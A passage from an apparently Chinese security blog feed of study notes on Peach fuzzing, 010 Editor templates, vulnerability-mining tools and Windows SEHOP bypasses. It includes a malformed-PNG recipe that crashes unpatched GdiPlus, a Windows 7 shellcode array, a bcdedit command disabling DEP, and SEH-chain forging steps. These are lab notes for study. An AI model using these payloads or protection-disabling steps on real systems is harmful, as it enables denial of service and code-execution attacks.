* Import：要导入的Python库
* PythonPath：要添加的python库路径
</code></pre><p>在HelloWorld中，GeneralConf部分只需写入:</p>
<pre><code>&lt;!-- Import defaults for Peach instance --&gt;
&lt;Include ns="default" src="file:defaults.xml" /&gt;
</code></pre>

<p>二、 DataModel<br>DataModel用来定义数据模型，包括数据结构和数据关系等。一个Peach Pit文件中需要包含一个或多个数据类型。常见的有:</p>
<pre><code>* String：属性有name, size, value, isStatic
* Number：属性有name, size
* Blob: 无具体数据类型，属性有name
* Block： 用于对数据进行分组，属性有name
</code></pre><p>HelloWorld程序中定义的:</p>
<pre><code>&lt;!-- Create a simple data template containing a single string --&gt;
&lt;DataModel name="HelloWorldTemplate"&gt;
        &lt;String value="Hello World!" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>三、StateModel<br>StateModel用于描述如何向目标程序发送/接收数据。StateModel由至少一个State组成，并且用initialState指定一个State；每个State由至少一个Action组成，Action用于定义StateModel中的各种动作，动作类型由type来指定。Action支持的动作类型包括start、stop、open、close、input、output、call等。</p>
<p>当代码中有多个Action时，则从上往下依次执行。</p>
<pre><code>&lt;StateModel name="State" initialState="State1" &gt;
        &lt;State name="State1"&gt;
                &lt;Action type="output" &gt;
                        &lt;DataModel ref="HelloWorldTemplate"/&gt;
                &lt;/Action&gt;
        &lt;/State&gt;
&lt;/StateModel&gt;
</code></pre>

<p>四、Agent<br>Agent用于定义代理和监视器，可以用来调用Windbg等调试器来检测程序运行的错误信息等，一个Peach Pit文件可以定义多个Agent，每个Agent下可以定义多个Monitor。<br>Monitor类型为debugger.WindowsDebugEngine，是调用Windbg来执行下面的&quot;notepad.exe filename&quot;命令；而若类型为process.PageHeap，则是为notepad.exe开启页堆调试(Page Heap Debug)。</p>
<p>五、Test and Run configuration<br>Test元素用来定义一个测试的配置，包括一个StateModel和一个Publisher，以及including/execluding、Agent信息等。其中StateModel和Publisher是必须定义的，其他可选。Publisher用来定义Peach的IO连接，可以构造网络数据流(如TCP，UDP，HTTP)和文件流(如FileWriter，FileReader)等</p>
<p>在HelloWorld程序中，需要的是将畸形数据显示到命令行，所以Publisher用的是标准输出stdout.Stdout</p>
<pre><code>&lt;Test name="HelloWorldTest"&gt;
        &lt;StateModel ref="State"/&gt;
        &lt;!-- Display test cases to the console --&gt;
        &lt;Publisher class="stdout.Stdout" /&gt;
&lt;/Test&gt;
</code></pre>


<p>Run元素用来定义要运行哪些测试，包括一个或多个Test，另外还可以通过Logger元素配置日志来捕获运行结果。当然，Logger是可选的</p>
<p>HelloWorld程序中，run配置如下：</p>
<pre><code>&lt;!-- Configure a single run --&gt;
&lt;Run name="DefaultRun" description="Stdout HelloWorld Run"&gt;

        &lt;Test ref="HelloWorldTest" /&gt;

&lt;/Run&gt;
</code></pre>


<h4 id="2-4-定义数据之间的依存关系"><a href="#2-4-定义数据之间的依存关系" class="headerlink" title="2.4 定义数据之间的依存关系"></a>2.4 定义数据之间的依存关系</h4><p>在Peach Pit中可以用Relation元素来表示数据长度、数据个数以及数据偏移等信息。格式如下:</p>
<pre><code>&lt;Relation type="size" of="Data" /&gt;
&lt;Relation type="count" of="Data" /&gt;
&lt;Relation type="offset" of="Data" /&gt;
</code></pre>

<p>同样，数据校验值也可以通过Fixup来表示。Fixup支持的校验类型包括CRC32、MD5、SHA1、SHA256、EthernetChecksum、SspiAuthentication等，这可参考官方文档。Fixup格式如下:</p>
<pre><code>&lt;Fixup class="FixupClass"&gt;
    &lt;Param name="ref" value="Data" /&gt;
&lt;/Fixup&gt;
</code></pre>

<p>FixupClass可以为checksum.Crc32Fixup、checksum.SHA256Fixup等。</p>
<p>Crc32Fixup数据模型示例:</p>
<table>
<thead>
<tr>
<th>Offset</th>
<th>Size</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x00</td>
<td>4 bytes</td>
<td>Length of Data</td>
</tr>
<tr>
<td>0x04</td>
<td>4 bytes</td>
<td>Type</td>
</tr>
<tr>
<td>0x08</td>
<td>Data</td>
</tr>
<tr>
<td>after data</td>
<td>4 bytes</td>
<td>CRC of Type and Data</td>
</tr>
</tbody>
</table>
<p>上面数据模型的实现:</p>
<pre><code>&lt;DataModel name="HelloData"&gt;
&lt;Number name="Length" size="32"&gt;
    &lt;Relation type="size" of="Data"/&gt;
&lt;/Number&gt;
&lt;Block name="TypeAndData"&gt;
    &lt;String name="Type" size="32" /&gt;
    &lt;Blob name="Data"/&gt;
&lt;/Block&gt;
&lt;Number name="CRC" size="32"&gt;
    &lt;Fixup class="checksums.Crc32Fixup"&gt;
        &lt;Param name="ref" value="TypeAndData" /&gt;
    &lt;/Fixup&gt;
&lt;/Number&gt;
&lt;/DataModel&gt;
</code></pre>

<h4 id="2-5-用Peach-Fuzz-PNG文件"><a href="#2-5-用Peach-Fuzz-PNG文件" class="headerlink" title="2.5 用Peach Fuzz PNG文件"></a>2.5 用Peach Fuzz PNG文件</h4><p>首先看看png图片的格式，如图所示:<br><img src="/images/2017-07-28/png.jpg" alt="png文件格式"></p>
<p>png最前面是8字节PNG签名，十六进制为89 50 4E 0D 0A 1A 0A。随后是若干个数据区块(Chunk)，包括IDHR、IDAT、IEND等。</p>
<p>png文件Chunk格式</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Size</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>Length</td>
<td>4 bytes</td>
<td>Length of data field</td>
</tr>
<tr>
<td>Type</td>
<td>4 bytes</td>
<td>Chunk type code</td>
</tr>
<tr>
<td>Data</td>
<td></td>
<td>Data Bytes</td>
</tr>
<tr>
<td>CRC</td>
<td>4 bytes</td>
<td>CRC of type and data</td>
</tr>
</tbody>
</table>
<p>可以将Chunk的DataModel定义如下:</p>
<pre><code>&lt;DataModel name="Chunk"&gt;
&lt;Number name="Length" size="32" signed="false"&gt;
    &lt;Relation type="size" of="Data"/&gt;
&lt;/Number&gt;
&lt;Block name="TypeAndData"&gt;
    &lt;String name="Type" size="4" /&gt;
    &lt;Blob name="Data" /&gt;
&lt;/Block&gt;
&lt;Number name="CRC" size="32"&gt;
    &lt;Fixup class="checksums.Crc32Fixup"&gt;
        &lt;Param name="ref" value="TypeAndData" /&gt;
    &lt;/Fixup&gt;
&lt;/Number&gt;
&lt;/DataModel&gt;
</code></pre>

<p>PNG简单地认为是由一个PNG签名和若干个结构相同的Chunk组成。在Chunk数据模型之后将PNG文件的DataModel进行如下定义：</p>
<pre><code>&lt;DataModel name="Png"&gt;
&lt;Blob name="pngMagic" isStatic="true" valueTyp="hex" value="89 50 4E 47 0D 0A 1A 0A" /&gt;
&lt;Block ref="Chunk" minOccurs="1" maxOccurs="1024" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>minOccurs=&quot;1&quot; maxOccurs=&quot;1024&quot;表示该区块最少重复1次，最多重复1024次</p>
<p>然后配置StateModel:第一步修改文件生成畸形文件；第二部需要把文件关闭；第三步需要调用适当的程序打开生成的畸形文件（这里使用pngcheck）。</p>
<pre><code>&lt;StateModel name="TheState" initialState="Initial"&gt;
    &lt;State name="Initial"&gt;
        &lt;!-- Write out our png file --&gt;
        &lt;Action type="output"&gt;
            &lt;DataModel ref="Png" /&gt;
            &lt;!-- This is our sample file to read in --&gt;
            &lt;Data name="data" fileName="sample.png" /&gt;
        &lt;/Action&gt;
    &lt;/State&gt;

    &lt;!-- Close file --&gt;
    &lt;Action type="close"/&gt;

    &lt;!-- Launch the target process --&gt;
    &lt;Action type="call" method="D:\tweakpng.exe"&gt;
        &lt;Param name="png file" type="in"&gt;
            &lt;DataModel ref="Param" /&gt;
            &lt;Data name="fileName"&gt;
                &lt;!-- Name of Fuzzed output file --&gt;
                &lt;Field name="Value" value="peach.png" /&gt;
            &lt;/Data&gt;
        &lt;/Param&gt;
    &lt;/Action&gt;
&lt;/StateModel&gt;
</code></pre>

<p>在call动作中我们引入了&quot;Param&quot;的数据类型，这个数据模型用来存放传达给pngcheck.exe/tweakpng.exe的参数，即畸形文件的文件名。所以&quot;Param&quot;需要包含一个名为&quot;Value&quot;的字符型静态数据。<br>所以需要在StateModel之前定义该数据模型:</p>
<pre><code>&lt;DataModel name="Param"&gt;
    &lt;String name="Value" isStatic="true" /&gt;
&lt;/DataModel&gt;
</code></pre>

<p>然后在Test元素中配置Publisher信息。这里需要FileWriterLauncher，它能在写完文件后使用call动作启用一个线程。</p>
<pre><code>&lt;Test name="TheTest"&gt;
    &lt;StateModel ref="TheState"/&gt;
    &lt;Publisher class="file.FileWriterLauncher"&gt;
        &lt;Param name="filename" value="peach.png" /&gt;
    &lt;/Publisher&gt;
&lt;/Test&gt;
</code></pre>

<p>最后在Run信息配置中指定要运行的测试名称</p>
<pre><code>&lt;Run name="DefaultRun"&gt;
    &lt;Test ref="TheTest" /&gt;
&lt;/Run&gt;
</code></pre>

<p>接下来对png_dumb.xml进行一些改动，让程序调用windows资源管理器打开畸形文件。<br>首先，在StateModel的Action中将tweakpng.exe程序替换为&quot;explorer&quot;<br>然后，在Publisher配置中将class改为file.FileWriterLauncherGui，并且为Publisher增加一个名为WindowName、值为peach.png的参数</p>
<p>FileWriterLauncherGui与FileWriterLauncher的区别:前者用于运行带界面的GUI程序，并且在运行后会自动关闭窗口标题中含有WindowName的值的GUI窗口。</p>
<p>为了捕获程序的异常，还需配置Agent and Monitor，调用WinDbg进行测试。</p>
<p>首先将StateModel中最后一个Action删掉，并添加这一行</p>
<pre><code>&lt;Action type="call" method="ScoobySnacks" /&gt;
</code></pre>

<p>然后在StateModel下面加入Agent配置</p>
<pre><code>&lt;Agent name="LocalAgent"&gt;
    &lt;Monitor class="debugger.WindowsDebugEngine"&gt;
        &lt;Param name="CommandLine" value="explorer peach.png"/&gt;
        &lt;Param name="StartOnCall" value="ScoobySnacks" /&gt;
    &lt;/Monitor&gt;

    &lt;Monitor class="process.PageHeap"&gt;
        &lt;Param name="Executable" value="explorer" /&gt;
    &lt;/Monitor&gt;
&lt;/Agent&gt;
</code></pre>

<p>然后在Test配置的第一行加入:</p>
<pre><code>&lt;Agent ref="LocalAgent" /&gt;
</code></pre>

<p>并且在Publisher的最后一行加入名为debugger，值为true的参数</p>
<pre><code>&lt;Param name="debugger" value="true" /&gt;
</code></pre>

<p>最后在Run配置的Test元素后面加入日志配置:</p>
<pre><code>&lt;Logger class="logger.Filesystem"&gt;
    &lt;Param name="path" value="logs" /&gt;
&lt;/Logger&gt;
</code></pre>

<p>重新运行Fuzzer，实验效果是Fuzzer程序启动了一个Local Peach Agent，通过该Agent控制WinDbg进行调试并捕获异常事件。</p>
<font color="#f00"><br>本次实验其实很简单，但是环境一定得按照要求来。<br>windbg 版本为 6.8，是否是x86，抑或是amd64，得与python安装版本一致；<br>python 版本为2.5+，一定是版本2<br>peach 版本为v2.3。该版本能与windbg 6.8兼容，但是不能与6.12兼容。<br></font>

<h3 id="3-010脚本"><a href="#3-010脚本" class="headerlink" title="3. 010脚本"></a>3. 010脚本</h3><h4 id="3-1-010-Editor简介"><a href="#3-1-010-Editor简介" class="headerlink" title="3.1 010 Editor简介"></a>3.1 010 Editor简介</h4><p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
<p>以PNG文件解析为例：用010 Editor打开PNG文件，然后通过Templates-&gt;Open Template菜单打开PNGTemplate.bt，按F5键运行脚本，在窗口中选择该PNG文件，就可以看到解析结果。</p>
<h4 id="3-2-010脚本编写入门"><a href="#3-2-010脚本编写入门" class="headerlink" title="3.2 010脚本编写入门"></a>3.2 010脚本编写入门</h4><p>010 Editor分析脚本与C/C++的结构体定义比较类似。但是其是一个自上而下执行的程序，可以使用if、for、while等语句。</p>
<pre><code>char header[4];
int numRecords;
</code></pre>

<p>意味着文件 首4个字节将会映射到字符数组header中，下4个字节则会映射到整型变量numRecords中，并最终显示在解析结果中。<br>但是也可能有这种情况：需要定义一些变量，但是这些变量并不对应着文件中的任何字节，而仅仅是程序运行中所需要的，这时可用哪个local关键字来定义变量。</p>
<pre><code>local int i, total=0;
int RecordCounts[5];
for(i=0; i&lt;5; i++)
    total += recordCounts[i];
double records[total];
</code></pre>

<p>另外在数据的定义中，可以加上一些附加属性，如格式、颜色、注释等。附加属性用尖括号&lt;&gt;括起来。常用的属性包括：</p>
<pre><code>&lt;format=hex|decimal|octal|binary, fgcolor=&lt;color&gt;, bgcolor=&lt;color&gt;, comment="&lt;string&gt;", open=true|false|suppress, hidden=true|false, read=&lt;function_name&gt;, write=&lt;function_name&gt; &gt;
</code></pre>

<p>实例：<br>文件格式示例如图所示:<br><img src="/images/2017-07-28/file_structure.jpg" alt="文件格式"><br>脚本如下：</p>
<pre><code>struct FILE{
    struct HEADER{
        char type[4];
        int version;
        int numRecords;
    } header;

    struct RECORD{
        int len;
        char name[20];
        if(file.header.version == 1)
            char data[len];
        if(file.header.version == 2)
            byte data[len];
    } record[file.header.numRecords];

} file;
</code></pre>

<h4 id="3-3-010脚本编写提高——PNG文件解析"><a href="#3-3-010脚本编写提高——PNG文件解析" class="headerlink" title="3.3 010脚本编写提高——PNG文件解析"></a>3.3 010脚本编写提高——PNG文件解析</h4><p>首先定义PNG签名和Chunk两种结构，PNG文件签名：</p>
<pre><code>const uint64 PNGMAGIC = 0x89504E470D0A1A0AL;
</code></pre>

<p>然后是PNG的Chunk格式:</p>
<pre><code>typedef struct{
    uint32 length;
    char ctype[4];
    ubyte data[length];
    uint32 crc &lt;format=hex&gt;;
} CHUNK
</code></pre>

<p>还需定义CHUNK结构体的read函数，以便在显示解析结果时能够给出每个Chunk的名字，显然ctype的值可以作为Chunk的名字。在ctype中，每个字节的第三位还分别标识了该Chunk的一些附加信息：</p>
<table>
<thead>
<tr>
<th>位置</th>
<th>1</th>
<th>0</th>
</tr>
</thead>
<tbody>
<tr>
<td>第1字节的第3位</td>
<td>Ancillary</td>
<td>Critical</td>
</tr>
<tr>
<td>第2字节的第3位</td>
<td>Private</td>
<td>Public</td>
</tr>
<tr>
<td>第3字节的第3位</td>
<td>ERROR_RESERVED</td>
<td></td>
</tr>
<tr>
<td>第4字节的第3位</td>
<td>Safe to Copy</td>
<td>UnSafe to Copy</td>
</tr>
</tbody>
</table>
<p>说明:</p>
<ul>
<li>Ancillary标识该区块是辅助区块，该区块可有可无；Critical表示该区块是关键区块，这些区块是必须的</li>
<li>Private表示该区块是不在PNG标准规格(PNG specification)区块中，属于该PNG文件私有，其名称的第二个字母是小写；Public表示该区块属于PNG标准区块，其名称的第二个字母是大写。</li>
<li>Safe to Copy表示该区块与图像数据无关，可以随意复制到改动过的PNG文件中；Unsafe to Copy表示该区块内容与图像数据息息相关，如果对文件的Critical区块进行了增删改等操作，则该区块也需要进行相应的修改</li>
</ul>
<p>于是CHUNK结构定义如下函数：</p>
<pre><code>string readCHUNK(local CHUNK &c){
    local string s;
    s = c.ctype + "  (";
    s += (c.ctype[0] & 0x20) ? "Ancillary, " : "Critical, ";
    s += (c.ctype[1] & 0x20) ? "Private, "   : "Public, ";
    s += (c.ctype[2] & 0x20) ? "ERROR_RESERVED, " : "";
    s += (c.ctype[3] & 0x20) ? "Safe to Copy)" : "Unsafe to Copy)";
    return s;
}
</code></pre>

<p>同时在定义好的CHUNK结构体后加上read属性，即把“} CHUNK;”改为:</p>
<pre><code>} CHUNK &lt;read=readCHUNK&gt;
</code></pre>

<p>最后写入解析&quot;主函数&quot;:</p>
<pre><code>uint64 pngid &lt;format=hex&gt;;

if(pngid != PNGMAGIC){
    Warning("Invalid PNG File: Bad Magic Number");
    return -1;
}

while(!FEof()){
    CHUNK chunk;
}
</code></pre>

<p>另外，由于PNG文件是按照BigEndian格式进行存储的，所以需要在脚本的第一行加入:</p>
<pre><code>BigEndian();
</code></pre>

<p><b>漏洞</b></p>
<p>实验环境<br>操作系统： Win XP SP3<br>GdiPlus.dll版本： 5.1.3102.5512</p>
<p>在之前的PNG解析结果中找到IHDR Chunk的length位置，也就是第9-12字节，通常情况下其值为13(0x0D)，现在换成0xFFFFFFF4，并将文件另存为poc.png。<br>在实验环境下打开poc.png，打开资源管理器，会发现explorer.exe的CPU占用率升至100%，使系统接近宕机状态，只有强行结束或者重启explorer.exe进程才能使系统恢复正常。</p>
<p>实际上gdiplus.dll在处理IHDR时存在整数溢出漏洞。该漏洞的危害：</p>
<ol>
<li>打开poc.png或者打开poc.png所在文件夹的未打补丁的用户死机</li>
<li>将poc.png挂载某网页上，访问该页面的未打补丁用户死机</li>
<li>设为QQ或MSN头像，查看头像的未打补丁用户死机</li>
</ol>
<h4 id="3-4-PPT文件解析"><a href="#3-4-PPT文件解析" class="headerlink" title="3.4 PPT文件解析"></a>3.4 PPT文件解析</h4><p>office系列软件使用的文件格式分为两个：<br>Office97~Office2003：使用基于二进制的文件格式，文件名后缀为doc、ppt、xls等<br>Office2003及更高版本：使用基于XML的文件格式，文件名后缀为docx、pptx、xlsx等。</p>
<p>本节以PowerPoint97~2003所用的二进制文件格式，PPT文件的解析过程从逻辑上分为如下四层：</p>
<table>
<thead>
<tr>
<th>测试深度</th>
<th>解析逻辑</th>
<th>数据粒度</th>
<th>Fuzz方法</th>
</tr>
</thead>
<tbody>
<tr>
<td>Level1</td>
<td>OLE2 解析器</td>
<td>离散分布的512字节数据段</td>
<td>修改OLE文件头、FAT区块、目录区块等位置的数据结构</td>
</tr>
<tr>
<td>Level2</td>
<td>PPT 记录解析器</td>
<td>流和信息库</td>
<td>修改流中的数据，破坏记录头和数据的关系</td>
</tr>
<tr>
<td>Level3</td>
<td>PPT 对象创建器</td>
<td>原子和容器</td>
<td>用负载替换原子数据</td>
</tr>
<tr>
<td>Level4</td>
<td>PPT 对象内部逻辑</td>
<td>原子记录内部的integer、bool、string等类型数据</td>
<td>用相关的负载修改字节数据</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[漏洞挖掘技术简介]]></title>
      <url>/2017/07/28/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-漏洞挖掘概述"><a href="#1-漏洞挖掘概述" class="headerlink" title="1. 漏洞挖掘概述"></a>1. 漏洞挖掘概述</h3><h4 id="1-1-Fuzz测试"><a href="#1-1-Fuzz测试" class="headerlink" title="1.1 Fuzz测试"></a>1.1 Fuzz测试</h4><p>这是一种黑盒测试，与基于功能性的测试有所不同，Fuzz主要目的是&quot;crash&quot;、&quot;break&quot;、&quot;destroy&quot;。</p>
<p>Fuzz的测试用例往往是带有攻击性的畸形数据，用以触发各种类型的漏洞。</p>
<p>Fuzz测试的优点：很少出现误报，能够快速找到真正的漏洞<br>Fuzz测试的缺点：永远不能保证系统中已经没有漏洞</p>
<h4 id="1-2-学术界与工业界的区别"><a href="#1-2-学术界与工业界的区别" class="headerlink" title="1.2 学术界与工业界的区别"></a>1.2 学术界与工业界的区别</h4><p>学术界偏向于<font color="#f00">对源代码进行静态分析</font>，直接在程序的逻辑上寻找漏洞。方法和理论有：(可追溯于1976年在ACM Computing Surveys上的论文Data Flow Analysis Software Reliability)</p>
<ul>
<li>数据流分析</li>
<li>类型验证系统</li>
<li>边界检验系统</li>
<li>状态机系统等</li>
</ul>
<h4 id="1-3-审计源代码的工具"><a href="#1-3-审计源代码的工具" class="headerlink" title="1.3 审计源代码的工具"></a>1.3 审计源代码的工具</h4><ol>
<li>Fortify在编译阶段扫描若干安全风险</li>
<li>Rough Auditing Tool for Security(RATS)用于分析C/C++语言的语法树，寻找存在潜在安全问题的函数调用</li>
<li>BEAM(Bugs Errors And Mistakes)，IBM的静态代码分析工具，使用数据楼分析的方法，分析源代码的所有可执行路径，以检测代码中潜在的bug</li>
<li>SLAM用于检测驱动中的bug</li>
<li>Flaw Finder用Python语言开发的代码分析工具</li>
<li>Prexis可审计多种语言的源代码，审计的漏洞类型超过30种</li>
</ol>
<h3 id="2-动态测试技术"><a href="#2-动态测试技术" class="headerlink" title="2. 动态测试技术"></a>2. 动态测试技术</h3><h4 id="2-1-SPIKE"><a href="#2-1-SPIKE" class="headerlink" title="2.1 SPIKE"></a>2.1 SPIKE</h4><p>SPIKE是Protocol Fuzz(针对网络协议的模糊测试)工具<br><img src="/images/2017-07-28/block_data.jpg" alt="基于Block的数据定义方法"></p>
<p>spike运行在linux环境下，当然对代码进行一定的修改之后就可以运行在windows上。<br>Dave Aitel实现了一套功能强大的API和数据结构用于定义数据块。SPIKE就是这样一套函数与数据结构的集合。</p>
<p>Hello World用例：</p>
<h4 id="2-2-beSTORM简介"><a href="#2-2-beSTORM简介" class="headerlink" title="2.2 beSTORM简介"></a>2.2 beSTORM简介</h4><p>由Beyond Security安全公司开发，运行在windows上的一款全能型安全审计程序，其利用模糊测试技术实现对网络协议的安全测试。</p>
<h3 id="3-静态代码审计"><a href="#3-静态代码审计" class="headerlink" title="3. 静态代码审计"></a>3. 静态代码审计</h3><p>Coverity是用来提高软件质量的源代码静态分析工具。<br>Coverity使用checker模块来检测漏洞，默认情况下的checker包括：</p>
<ol>
<li>C checkers，内存错误、缓冲区溢出、函数的参数及返回值</li>
<li>Concurrency checkers，线程同步、锁机制等</li>
<li>Security checker，可信数据流的分析、字符串溢出等</li>
</ol>
<p>所有静态代码分析的理论和技术都面临的棘手问题：<br>如何处理程序逻辑中由动态因素引起的复杂条件分支和循环</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击SEHOP的方法]]></title>
      <url>/2017/07/18/%E6%94%BB%E5%87%BBSEHOP%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-攻击返回地址"><a href="#1-攻击返回地址" class="headerlink" title="1. 攻击返回地址"></a>1. 攻击返回地址</h3><p>如果程序启用了SEHOP但是未启用GS，或者启用了GS但是刚好被攻击的函数没有GS保护，那么就可以供给函数的返回地址！</p>
<h3 id="2-攻击虚函数"><a href="#2-攻击虚函数" class="headerlink" title="2. 攻击虚函数"></a>2. 攻击虚函数</h3><p>SEHOP保护的只是SEH，对于SEH以外的不提供保护。所以我们可以通过攻击虚函数来劫持程序流程，这个过程不涉及任何异常处理。</p>
<h3 id="3-利用未启用SEHOP的模块"><a href="#3-利用未启用SEHOP的模块" class="headerlink" title="3. 利用未启用SEHOP的模块"></a>3. 利用未启用SEHOP的模块</h3><p>出于兼容性的考虑，对一些程序禁用了SEHOP，如经过Armadilo加壳的软件。</p>
<p>操作系统会根据PE头MajorLinkerVersion和MinorLinkerVersion两个选项来判断是否为程序禁用SEHOP。可以将这两个选项设置为0x53和0x52来模拟经过Armadilo加壳的程序，从而达到禁用SEHOP的目的！</p>
<p>此处是通过CFF Explorer来进行这种处理<br><img src="/images/2017-07-18/set_version.jpg" alt="CFF Explorer修改PE头来禁用SEHOP"></p>
<h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>windows 7</td>
<td></td>
</tr>
<tr>
<td>EXE编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>DLL编译器</td>
<td>VC++ 6.0</td>
<td>将dll基址设置为0x11120000</td>
</tr>
<tr>
<td>系统SEHOP</td>
<td>启用</td>
<td></td>
</tr>
<tr>
<td>秩序DEP</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>程序ASLR</td>
<td>EXE随意，DLL禁用</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p><b>windows 7 下的弹出对话框的shellcode</b></p>
<pre><code>
char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09<font color="#f00">\x8B\x09</font>\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";
</code></pre>

<p>上面代码中的红字是与xp和window 2000中不同的shellcode之处，其指代的意思是mov ecx, [ecx]<br>之所以在此处多加这一句，是因为ntdll.dll链的下一个为KERNELBASE.dll，而它下一个才是kernel32.dll，这也是win7与之前的系统的不同之处！</p>
<p>本次实验是在&quot;利用未启用SafeSEH模块&quot;实验的基础上进行的</p>
<p>win7中关闭DEP的方法：cmd窗口中<br>bcdedit.exe/set {current} nx AlwaysOff pause</p>
<p>首先为SEH_NOSafeSEH_JUMP.dll禁用SEHOP，使用CFF Explorer打开SEH_NOSafeSEH_JUMP.dll后在Optional header选项页中来进行设置，分别将MajorLinkerVersion和MinorLinkerVersion设置为0x53和0x52。这个如上图</p>
<p>然后对演示的主程序进行一定的修改：</p>
<ol>
<li>修改弹出对话框的shellcode，让其可以在windows 7下正常弹出</li>
<li>取消程序的/NXCOMPAT链接选项来禁用程序的DEP</li>
</ol>
<font color="#f00">不知道什么原因，到目前为止，我还没有实现弹出对话框的效果</font>

<h3 id="4-伪造SEH链表"><a href="#4-伪造SEH链表" class="headerlink" title="4. 伪造SEH链表"></a>4. 伪造SEH链表</h3><p>伪造SEH是非常困难的，首先需要系统的ASLR不能启用，因为伪造SEH链时需要用到FinalExceptionHandler指向的地址，如果每次系统重启后这个地址都变化的话，溢出的成功率将大大降低。</p>
<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p>伪造SEH链绕过SEHOP所需的条件：</p>
<ol>
<li>下图中的0xXXXXXXXX地址必须指向当前栈中，而且必须能够被4整除</li>
<li>0xXXXXXXXX处存放的异常处理记录作为SEH链的最后一项，其异常处理函数指针必须指向终极异常处理函数</li>
<li>突破SEHOP检查后，溢出程序还需搞定SafeSEH</li>
</ol>
<p><img src="/iamges/2017-07-18/seh.jpg" alt="伪造SEH链示意图"></p>
<p>为了方便，本实验在&quot;利用未启用SafeSEH模块绕过SafeSEH&quot;的基础上进行，不用考虑SafeSEH问题，只需确定0xXXXXXXXX的值和FinalExceptionHandler指向的地址即可。</p>
<p><b>实验思路</b></p>
<ol>
<li>通过未启用SafeSEH的SEH_NOSafeSEH_JUMP.dll来绕过SafeSEH</li>
<li>通过伪造SEH链，造成SEH链未被破坏的假象来绕过SEHOP</li>
<li>SEH_NOSafeSEH中的test函数存在典型的溢出</li>
<li>使用SEH_NOSafeSEH_JUMP.dll中的“pop pop retn”指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行&quot;pop pop retn&quot;指令，在执行retn后程序转入shellcode执行</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>windows 7</td>
<td></td>
</tr>
<tr>
<td>EXE编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>DLL编译器</td>
<td>VC++ 6.0</td>
<td>将dll基址设置为0x11120000</td>
</tr>
<tr>
<td>系统SEHOP</td>
<td>启用</td>
<td></td>
</tr>
<tr>
<td>秩序DEP</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>程序ASLR</td>
<td>关闭</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> windows </tag>
            
            <tag> SEH </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SEHOP原理]]></title>
      <url>/2017/07/17/SEHOP%E5%8E%9F%E7%90%86/</url>
